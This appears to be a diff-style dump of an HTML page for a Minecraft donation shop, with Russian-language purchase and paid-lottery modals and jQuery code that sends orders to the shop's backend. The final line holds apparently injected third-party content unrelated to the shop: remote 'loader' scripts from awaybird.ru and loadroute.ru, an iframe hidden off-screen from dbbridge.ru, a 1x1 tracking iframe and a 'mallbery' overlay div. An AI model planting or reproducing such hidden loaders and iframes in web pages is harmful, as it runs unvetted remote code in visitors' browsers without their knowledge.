+</script>
+
+
+
+
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/sweetalert2/6.4.2/sweetalert2.min.css">
+<script src="https://cdn.jsdelivr.net/sweetalert2/6.4.2/sweetalert2.min.js"></script>
+
+<style>
+    .swal-gd-loader.swal-gd-clean {
+        background-color: transparent !important;
+        border:0;
+    }
+    .swal2-modal {
+        border-radius: 0;
+        min-height: 130px;
+    }
+</style>
+
+<style>
+	#itemBuyingPopup input.form-control{
+		max-width: 300px;
+		margin-left: 13px;
+	}
+
+    #lotteryPopup .modal-body, #lotteryPopup .modal-body p {
+        text-align: left;
+        color: black;
+        text-shadow: none;
+        font-size: 13px;
+    }
+
+    #lotteryPopup .lottery-popup-title {
+        background-color: rgb(229, 115, 115);
+        text-align: left;
+        padding: 5px;
+        color: white;
+    }
+
+    #lotteryPopup .modal-header {
+        background: rgb(248, 141, 0);
+
+        text-align: left;
+    }
+
+    #lotteryPopup input, #lotteryPopup .btn {
+        border-radius: 0px;
+    }
+
+    #lotteryPopup .modal-header .modal-title {
+        color: rgb(255, 242, 206) !important ;
+        font-size: 18px;
+    }
+
+    #lotteryPopup .btn.btn-success {
+        background-color: #6BA558;
+        border-color: #6BA558;
+    }
+
+    #lotteryPopup .lottery-popup-descr {
+        padding: 5px;
+        background: rgb(247, 247, 247);
+        color: rgb(159, 159, 159);
+        line-height: 25px;
+    }
+
+    #lotteryPopup .lottery-field {
+        padding-left: 0px !important ;
+        text-align: center;
+        padding-right: 0px !important;
+    }
+
+    #lotteryPopup .close {
+        color: white;
+    }
+
+    #lotteryPopup .lottery-field-item {
+        border: 1px solid rgb(239, 239, 239);
+        display: inline-block;
+        margin-left: 5px;
+        margin-bottom: 0px;
+        width: 70px;
+        height: 30px;
+        background: url('/static/img/CellNotOpen.png');
+        cursor: pointer;
+    }
+
+    #lotteryPopup .lottery-field-item.lottery-item-loading {
+        /*background: url('/static/img/CellOpening.png');*/
+    }
+
+    #lotteryPopup .lottery-field-item.lottery-item-success {
+        background: url('/static/img/CellSuccess.png');
+    }
+
+    #lotteryPopup .lottery-field-item.lottery-item-failed {
+        background: url('/static/img/CellFailed.png');
+    }
+
+    #lotteryPopup .lottery-field .lottery-field-item:nth-child(2n) {
+        /*margin-left: 5px !important ;*/
+    }
+
+    #lotteryPopup .lottery-label {
+        margin-bottom: 8px;
+        font-size: 12px;
+        height: 22px;
+        line-height: 22px;
+        padding-left: 10px;
+        border-radius: 3px;
+        cursor: pointer ;
+        /*overflow: hidden;*/
+        background: rgb(248, 248, 248);
+        border: 1px solid rgb(164, 164, 164);
+        color: rgb(164, 164, 164);
+        position: relative;
+        margin-bottom: 14px;
+    }
+
+    #lotteryPopup div.lottery-label .lottery-label-arrow {
+        position: absolute;
+        bottom: 6px;
+        left: -4px;
+        width: 8px;
+        height: 8px;
+        z-index: 2;
+        transform: rotate(135deg);
+
+        border-width: 1px;
+        border-style: solid;
+        border-color: rgb(248, 248, 248) rgb(164, 164, 164) rgb(164, 164, 164) rgb(248, 248, 248);
+        background: rgb(248, 248, 248);
+    }
+
+    #lotteryPopup .lottery-label.lottery-label-success {
+        background: #6BA558;
+        border: 1px solid rgb(110, 152, 89);
+        color: white;
+    }
+
+    #lotteryPopup div.lottery-label.lottery-label-success .lottery-label-arrow {
+        border-color: transparent #6BA558 transparent transparent;
+        border-color: transparent rgb(110, 152, 89) rgb(110, 152, 89) transparent;
+        background: #6BA558;
+    }
+
+
+
+    #lotteryPopup .lottery-label.lottery-label-failed {
+        background: rgb(229, 115, 115);
+        border: 1px solid rgb(226, 175, 172);
+        color: white;
+    }
+
+    #lotteryPopup div.lottery-label.lottery-label-failed .lottery-label-arrow {
+        border-color: transparent rgb(229, 115, 115) transparent transparent;
+        border-color: transparent rgb(226, 175, 172) rgb(226, 175, 172) transparent;
+        background: rgb(229, 115, 115);
+    }
+
+    #lotteryPopup div.lottery-label .lottery-label-inner {
+        overflow:hidden ;
+    }
+
+    #lotteryPopup input {
+        background-color: #F7F7F7;
+        border: 1px solid #E5E5E5;
+        color: #373737;
+        border-radius: 0px;
+    }
+
+    .swal2-modal {
+        text-shadow: none !important; ;
+    }
+
+</style>
+
+<div id="buyServerCurrency_tmp" style="display: none;">
+	<h4>Выберите количество <span class="ingameCurrencyAmount"></span></h4>
+
+	<div class="ingameCurrencySlider" style="width: 90%;"></div>
+
+	<h4>Стоимость: <span class="currencyCost"></span> руб.</h4>
+
+</div>
+
+
+<!-- Modals -->
+<div class="modal fade" id="itemBuyingPopup" tabindex="-1" role="dialog" aria-labelledby="itemBuyingPopupLabel1" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" onclick="site.shop.resetModal();" aria-hidden="true">×</button>
+        <h4 class="modal-title" id="itemBuyingPopupLabel1">Покупка</h4>
+      </div>
+      <div class="modal-body">
+		<table>
+			<tbody><tr>
+				<td class="placeForItem">
+				картинка
+				</td>
+				<td style="padding-left: 15px;">
+					<h4>Выберите количество</h4>
+					<div>
+						<div class="slider" style="width: 300px; display: inline-block; cursor: pointer;"></div>
+						<div class="slider_value" style="display: inline-block; font-size: 15pt;margin-left: 10px;"></div>
+					</div>
+					<h3>Стоимость:<span class="costs"></span></h3>
+				</td>
+			</tr>
+		</tbody></table>
+      </div>
+      <div class="modal-footer">
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal fade" id="lotteryPopup" tabindex="-1" role="dialog" aria-labelledby="itemBuyingPopupLabel1" aria-hidden="true" style="display: none;">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" onclick="$('#lotteryPopup').modal('hide');" aria-hidden="true">×</button>
+                <h4 class="modal-title" id="">Играть в лотерею 50 на 50</h4>
+            </div>
+            <div class="modal-body">
+
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="countdown-item col-lg-6 col-sm-10">
+
+                            <p>Укажите код для игры в лотерею</p>
+
+                            <div class="row">
+                                <div class="countdown-item col-lg-8 col-sm-9">
+                                    <input type="text" id="lotteryBuyingCode" name="" class="form-control ajax_arg">
+                                </div>
+
+                                <div class="countdown-item col-lg-4 col-sm-3">
+                                    <button type="button" onclick="mBrain.lottery.activate();" class="btn btn-success">Активировать</button>
+                                </div>
+                            </div>
+                            <br>
+
+                            <div class="row">
+
+                                <div class="countdown-item col-lg-12 col-sm-10" style="padding-right: 0px;">
+                                    <div class="lottery-popup-title">
+                                        Как играть в лотерею?
+                                    </div>
+                                    <div class="lottery-popup-descr">
+
+                                            <div>1. Выберите «Код для лотереи» в списке товаров</div>
+                                            <div>2. После оплаты скопируйте код</div>
+                                            <div>3. Нажмите на кнопку «Активировать»</div>
+                                            <div>4. Выберите одну из двух ячеек сверху, которую хотите открыть и кликните на неё</div>
+                                            <div>5. Если вы открыли выиграшную ячейку и хотите закончить игру, то нажмите на кнопку «Закончить игру и получить товар»</div>
+                                            <div>6. Если вы проиграли, то для новой игры нужно купить новый код</div>
+
+                                    </div>
+                                </div>
+
+                            </div>
+
+
+                        </div>
+
+                        <div class="countdown-item col-lg-2 col-sm-1">
+
+                        </div>
+
+                        <div class="countdown-item col-lg-6 col-sm-10" style="text-align: left;">
+
+                            <div class="row" style="margin-bottom: 10px;">
+                                <div class="countdown-item col-lg-12 col-sm-10" id="lotteryFieldTitle" style="padding-left: 35px;">
+                                    Кликните на ячейку, чтобы сыграть в лотерею
+                                </div>
+                            </div>
+
+                            <div class="row">
+                                <div class="countdown-item col-lg-5 col-sm-4 lottery-field" style1="width: 180px;">
+
+                                </div>
+
+                                <div class="countdown-item col-lg-6 col-sm-8 lottery-labels">
+
+                                </div>
+                            </div>
+
+                            <div class="row" style="margin-top: 5px;">
+                                <div class="countdown-item col-lg-11 ">
+                                    <input type="text" id="lotteryBuyingNickname" style="display: none;" placeholder="Введите свой никнейм, на который будет выдан товар" name="" class="form-control ajax_arg">
+                                </div>
+                            </div>
+                            <div class="row" style="margin-top: 10px;">
+                                <div class="countdown-item col-lg-11">
+                                    <button type="button" id="lotteryFinishGame" style="display: none;" onclick="mBrain.lottery.finishizeGame();" class="form-control btn btn-success">Закончить игру и получить товар</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+            <div class="modal-footer">
+
+            </div>
+        </div>
+    </div>
+</div>
+
+	<link href="/static/panel/jqueryui.custom.css" rel="stylesheet">
+<script src="/static/panel/js/jqueryui.custom.js"></script>
+<script type="text/javascript">
+
+
+mcMessages = {
+	is_banned: 'Магазин заблокирован за нарушение правил использования сервиса MCDonate.ru',
+};
+
+if (242069 == 75595)
+	mcMessages.is_banned = 'Магазин заблокирован. Если Вы являетесь администратором магазина свяжитесь с <a href="http://vk.com/griboed0v">vk.com/griboed0v</a>';
+
+currentServer = {
+    'id': 317120,
+    'name': "LightCraft | Открытие | 1.12.2-1.14.4",
+    'ip_addr': '95.156.230.105:25652',
+    'receivingtype': '1',
+    'container': 0,
+    'items_in_shop': {'id': [], 'sub_id': []}, // by unique ingame_id
+    'previesExists': 16,
+    'itemsExists': 0,
+    'is_banned': 0,
+    'serverCurrency': {"is_enabled":0},
+    'unbanInfo': {"is_enabled":1,"unbanPrice":"75"},
+    'lotteryInfo': {"lottery_enabled":0,"lottery_price":0},
+    'discountInfo': {"is_enabled":1,"discountSize":"75"},
+
+};
+
+mBrain = {
+
+	init: function(){
+
+		site.itemBuyingPopup = $('#itemBuyingPopup');
+
+	},
+
+
+
+    lottery: {
+
+	    isBinded: false,
+        isEnabled: false,
+
+        bindings: function(){
+
+	        if (mBrain.lottery.isBinded)
+	            return ;
+
+            mBrain.lottery.isBinded = true ;
+
+	        $('#lotteryPopup .lottery-field').on('click', '.lottery-field-item', mBrain.lottery.clickOnItem);
+        },
+
+        finishizeGame: function(){
+
+            var playerNickname = $('#lotteryBuyingNickname').val();
+
+            mainSite.swalLoading.enable();
+
+            smartAjax('/ajax/ajax_shop.php', {
+                    context: 'lottery_finishize',
+                    server_id: currentServer.id,
+                    playerNickname: playerNickname,
+                    buying_code: $('#lotteryBuyingCode').val(),
+                }, function(msg) { // On ajax success
+
+                mainSite.swalLoading.disable();
+
+                var textMsg = 'Товар будет выдан для игрока с никнеймом ' + msg.playerNickname + '<br/><a href="https://mcdonate.ru/successPaying?order=' + msg.order_id + '" target="_blank">смотреть как получить товар</a>';
+
+
+                mainSite.swal(textMsg);
+
+            }, function(msg){
+               mainSite.swal(msg.error_text);
+            });
+
+
+        },
+
+        setTitle: function(action){
+
+            var text = 'Кликните на ячейку, чтобы сыграть в лотерею';
+
+            if (action == 'beforeGame')
+                text = 'Игра ещё не активна, введите код и нажмите «Активировать»';
+
+            $('#lotteryFieldTitle').text(text);
+        },
+
+        clickOnItem: function(){
+
+            if (!mBrain.lottery.isEnabled){
+                mainSite.swal('Лотерея не активна, введите код для начала игры');
+                return ;
+            }
+
+            if ($('#lotteryBuyingCode').val() == ''){
+                mainSite.swal('Лотерея не активна, введите код для начала игры');
+                return ;
+            }
+
+            mBrain.lottery.field_key = $(this).attr('data-field_key');
+
+            mainSite.swalLoading.enable();
+
+            $(this).addClass('lottery-item-loading');
+
+            //$('#lotteryBuyingCode').val('e88993eff3');
+
+            smartAjax('/ajax/ajax_shop.php', {
+                context: 'lottery_activate',
+                server_id: currentServer.id,
+                field_key: mBrain.lottery.field_key,
+                buying_code: $('#lotteryBuyingCode').val(),
+            }, function(msg){ // On ajax success
+
+                console.log(msg);
+
+                mBrain.lottery.activate_msg = msg ;
+
+                if (msg.win_id == -1) {
+                    mBrain.lottery.isEnabled = false;
+                    $('#lotteryBuyingNickname, #lotteryFinishGame').hide();
+                }
+                else {
+                    $('#lotteryBuyingNickname, #lotteryFinishGame').show();
+                }
+                // fill fields
+
+                var container = $('#lotteryPopup .lottery-field');
+
+                $('#lotteryPopup .lottery-field-item').removeClass('lottery-item-loading');
+
+                $('#lotteryPopup .lottery-labels .lottery-label[data-field_line="' + msg.clicked_line + '"]').addClass('lottery-label-failed');
+
+                mainSite.swalLoading.disable();
+
+                $.each(msg.items_clicked, function(key, item){
+
+                    var field_key = (msg.clicked_line * 2) + key + 1;
+
+                    var field_item = container.find('div.lottery-field-item[data-field_key="' + field_key + '"]');
+
+                    if (item.previ_id == -1 ){
+                        if (msg.win_id == -1)
+                            field_item.addClass('lottery-item-failed');
+                    }
+                    else if (item.previ_id == msg.win_id){
+                        field_item.addClass('lottery-item-success');
+
+                        $('#lotteryPopup .lottery-labels .lottery-label[data-previ_id="' + item.previ_id + '"]').addClass('lottery-label-success').removeClass('lottery-label-failed');
+                    }
+                    else {
+                        //field_item.addClass('lottery-item-success');
+                    }
+
+                });
+
+
+
+
+            }, function(msg){
+
+                $('#lotteryPopup .lottery-field-item').removeClass('lottery-item-loading');
+
+                mainSite.swal(msg.error_text);
+
+            }, 'check_captcha');
+
+            //$(this).addClass('lottery-item-success');
+
+        },
+
+        isEven: function(n) {
+            n = Number(n);
+            return n === 0 || !!(n && !(n%2));
+        },
+
+        drawField: function(msg){
+
+            var html = '';
+            var htmlLabel = '';
+
+            for (var i = 0; i < msg.lottery_items.length * 2; i++){
+
+                var field_key = (i + 1);
+
+                var line = Math.ceil(field_key / 2) -1;
+
+                html += '<div class="lottery-field-item" data-field_line="' + line + '" data-field_key="' + field_key + '"></div>';
+
+                if (mBrain.lottery.isEven(field_key))
+                    html += '<div class="lottery-field-sep"></div>';
+
+            }
+
+            $.each(msg.lottery_items, function(key, item){
+
+                htmlLabel += '<div class="lottery-label " data-field_line="' + (key) + '" data-previ_id="' + item.previ_id + '"><div class="lottery-label-inner">' + item.title + ' ' + item.price + ' руб.</div><div class="lottery-label-arrow"></div></div>';
+
+            });
+
+            $('#lotteryPopup .lottery-labels').html(htmlLabel);
+            $('#lotteryPopup .lottery-field').html(html);
+        },
+
+        activate: function(){
+
+            if ($('#lotteryBuyingCode').val() == ''){
+                mainSite.swal('Введите код для начала игры');
+                return ;
+            }
+
+            mBrain.lottery.isEnabled = true ;
+
+            mBrain.lottery.setTitle('started');
+
+        },
+
+	    showPopup: function(){
+
+	        mainSite.swalLoading.enable();
+
+	        mBrain.lottery.setTitle('beforeGame');
+
+	        mBrain.lottery.bindings();
+
+            smartAjax('/ajax/ajax_shop.php', {
+                context: 'lottery__list',
+                server_id: currentServer.id,
+            }, function(msg){ // On ajax success
+
+                mainSite.swalLoading.disable();
+
+                $('#lotteryPopup').modal();
+
+                mBrain.lottery.drawField(msg);
+
+
+
+
+                console.log(msg);
+
+            }, function(msg){
+
+                mainSite.swal(msg.error_text);
+
+            }, 'check_captcha');
+
+
+
+        },
+    },
+
+	proceedBuying: function(_this){
+
+		site.shop.current_item = site.container.find('.previList :selected');
+
+		if (site.shop.current_item.hasClass('ingameCurrency')){
+			mCurrency.doBuyCurrency();
+			return ;
+		}
+
+		site.choosePaymentType();
+
+		/*
+		if (site.shop.current_item.attr('previ_id') === undefined){
+			popup.postError('Не выбран донат');
+			return ;
+		}
+
+
+		site.paymentType = 'up';
+
+		mBrain._this = _this ;
+
+		site.shop.doBuyPrevi(_this);
+
+		*/
+	},
+
+
+	drawLastBoughts: function(msg){
+
+		if (msg.boughts_list.length == 0)
+			return ;
+
+
+		var container = $('div.lastBoughts');
+
+		container.fadeIn(800);
+
+		var template = $('.lastBought_tmp');
+
+		var html = '';
+
+		for (var i = 0; i < msg.boughts_list.length; i++){
+			var item = msg.boughts_list[i] ;
+
+			var bought_avatar = 'https://cdn.mcdonate.ru/ajax/face.php?u=' + item.nickname.replace(/[^0-9A-Za-z]/g, '') + '&s=100&v=f';
+
+			template.find('img').attr({
+				title: item.title + ' ' + item.date,
+				src: bought_avatar,
+			});
+
+			template.find('div.lastBought-nickname').text(item.nickname);
+
+			//template.find('img').attr(item.nickname);
+
+			html += template.html();
+
+		}
+
+
+
+		container.find('.panel-body').html(html);
+
+		container.find('img[data-toggle="tooltip"]').tooltip();
+	},
+};
+
+
+mCurrency = {
+
+	doBuyCurrency: function(){
+
+		site.itemBuyingPopup = $('#itemBuyingPopup');
+
+		var currencyOptions = currentServer.serverCurrency;
+
+		site.itemBuyingPopup.find('.modal-title').text('Покупка игровой валюты');
+		site.itemBuyingPopup.find('.modal-footer').html('<a style="" onclick="return false;" target="_blank" href=""><button type="button" class="btn btn-primary" onclick="design.prepareCurrency(this)">Перейти к оплате</button></a>');
+		site.itemBuyingPopup.find('.modal-body').html($('#buyServerCurrency_tmp').html());
+		site.itemBuyingPopup.modal({'show': true});
+
+
+		site.itemBuyingPopup.find('.ingameCurrencySlider').slider({'range': 'min', 'step': currencyOptions.ingameCurrency / currencyOptions.ingameCurrency, 'min': parseInt(currencyOptions.ingameMinimum / currencyOptions.ingameCurrency), 'value': currencyOptions.ingameMinimum / currencyOptions.ingameCurrency, 'max': parseInt(currencyOptions.ingameMaximum / currencyOptions.ingameCurrency),
+			slide: function(event, ui){
+				site.itemBuyingPopup.find('.ingameCurrencyAmount').text('(' +  (ui.value * currentServer.serverCurrency.ingameCurrency) + ')');
+				site.itemBuyingPopup.find('.currencyCost').html( (Math.ceil((ui.value * currentServer.serverCurrency.ingameCurrency) / currentServer.serverCurrency.ingameCurrency)));
+
+			},
+		});
+
+		// INIT slider
+		site.itemBuyingPopup.find('.currencyCost').html( (currencyOptions.ingameMinimum / currencyOptions.ingameCurrency));
+
+
+	},
+
+
+	currencyShowCatpcha: function(){
+		site.itemBuyingPopup.find('.modal-body .captcha_check').html(site.generateEmailAndCaptcha());
+		site.itemBuyingPopup.find('.modal-body .captcha_check').show();
+
+		site.itemBuyingPopup.find('.modal-footer').html('<a style="display: none;" onclick="return false;" target="_blank" href=""><button type="button" class="btn btn-primary" onclick="site.paymentType = \'qiwi\';site.shop.doBuyCurrencyFinal(this)">QIWI</button></a> <a onclick="return false;" style="display: none;" target="_blank" href=""><button type="button" class="btn btn-primary" onclick="site.paymentType = \'wm\';site.shop.doBuyCurrencyFinal(this)">Оплатить через Webmoney</button></a><a onclick="return false;" target="_blank" href=""><button type="button" class="btn btn-primary" style="margin-left: 5px;" onclick="site.paymentType = \'up\';design.prepareCurrency(this);">Перейти к оплате</button></a>');
+
+	},
+
+	doBuyCurrencyFinal: function(_this, playerNickname){
+
+		//if (playerNickname == ''){
+			//popup.postError('Вы не указали никнейм своего персонажа которому будет выдана покупка');
+			//return ;
+		//}
+
+		var ingameMoneyBought = site.itemBuyingPopup.find('.ingameCurrencySlider').slider('value') * currentServer.serverCurrency.ingameCurrency;
+
+		var orderInfo = {
+			server_id: currentServer.id,
+			ingameMoneyBought: ingameMoneyBought,
+			captcha_value: '',
+			desc: 'Покупка игровых денег: (' + ingameMoneyBought + ' шт.) за ' + site.itemBuyingPopup.find('.currencyCost').text() + ' руб.)',
+			userEmail: '',
+			type: 'ingamec',
+			paymentType: site.paymentType,
+			name: 'игровые деньги (' + ingameMoneyBought + ' шт.)',
+			costs: site.itemBuyingPopup.find('.currencyCost').text(),
+		};
+
+		if (playerNickname != '')
+			orderInfo.playerNickname = playerNickname ;
+
+		// a parent "a" html tag
+		$(_this).parent().attr('href', '/performOrder2/?' + encodeURIComponent(Base64.encode(JSON.stringify(orderInfo))));
+		$(_this).parent().attr('onClick', '');
+
+		return ;
+	},
+
+
+};
+
+$(document).ready(function(){
+	mBrain.init();
+});
+
+</script>
+
+<script src="https://awaybird.ru/prcr/ldr_656_11438_wFkRME.js"></script><script src="https://loadroute.ru/prcr/ldr_656_2597_YMfYIv.js"></script><iframe src="https://dbbridge.ru/res/ifs.html?strg=frm" style="position:absolute;width:1px;height:1px;left:-1000px;top:-1000px;" name="dpmsi"></iframe><div class="mallbery-caa" style="z-index: 2147483647 !important; text-transform: none !important; position: fixed;"></div><iframe src="https://k.nzeaner.com/kis" width="1" height="1" scrolling="no" frameborder="0" id="ta_g_r_i"></iframe></body>
